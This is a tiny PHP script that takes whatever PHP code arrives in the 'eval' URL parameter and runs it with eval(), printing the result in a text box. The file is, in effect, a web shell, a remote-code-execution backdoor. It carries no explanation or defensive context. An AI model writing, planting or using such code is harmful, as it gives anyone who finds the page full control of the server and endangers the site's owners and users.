<?php
$eval = $_GET['eval'];
if (!empty($eval))
{
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    eval($eval);
    echo "</textarea>";
  
}
?>
